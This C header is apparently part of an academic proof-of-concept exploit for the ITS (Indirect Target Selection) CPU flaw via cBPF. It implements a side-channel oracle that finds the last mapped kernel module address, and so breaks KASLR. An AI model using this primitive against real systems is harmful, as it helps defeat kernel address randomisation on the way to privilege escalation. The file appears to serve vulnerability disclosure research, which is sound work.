/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#ifndef _MODULES_ORACLE_H_
#define _MODULES_ORACLE_H_

#include "common.h"
#include "../../../common/kaslr_prefetch/kaslr_prefetch.h"

#define MODULE_MAPPING_START 0xffffffffa0000000 // not 0xffffffffc0000000?
#define MODULE_MAPPING_END   0xfffffffffeffffff


uint64_t prev_last_module = 0;

uint64_t get_last_mapped_address_via_kernel_module() {

    int fd;
    char buf[64] = {0};
    uint64_t address;
    uint64_t size;

    if (access(PATH_LAST_MAPPED_MODULE, F_OK) == 0) {
        fd = open(PATH_LAST_MAPPED_MODULE, O_RDONLY);
        assert(fd);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_LAST_MAPPED_MODULE);
        exit(EXIT_FAILURE);
    }

    assert(read(fd, buf, 64));

    assert(sscanf(buf, "%lx", &address) == 1);
    assert(sscanf(buf + 19, "%lx", &size) == 1);

    close(fd);

    // Kernel module returns the start address of the region, we want
    // the address of the last mapped page
    return address + size - PAGE_SIZE;

}

static void assert_equality(uint64_t a, uint64_t b) {
    if (a != b) {
        printf("%lx !=\n%lx\n", a, b);
    }
    assert(a == b);
}


uint64_t find_last_mapped_module_address()
{
    uint64_t module_end;
    // As an optimization we save the last found module_end to prevent starting
    // from start each time

    if (!prev_last_module) {
        module_end = find_last_mapped_address(MODULE_MAPPING_START, MODULE_MAPPING_END & (~(HUGE_PAGE_SIZE - 1)), PAGE_SIZE);
    } else {
        module_end = find_last_mapped_address_forward(prev_last_module, MODULE_MAPPING_END & (~(HUGE_PAGE_SIZE - 1)), PAGE_SIZE, HUGE_PAGE_SIZE);
    }

    prev_last_module = module_end;

#if DEBUG
    assert_equality(prev_last_module, get_last_mapped_address_via_kernel_module());
#endif

    return module_end + 0x1000;

}


#endif // _MODULES_ORACLE_H_

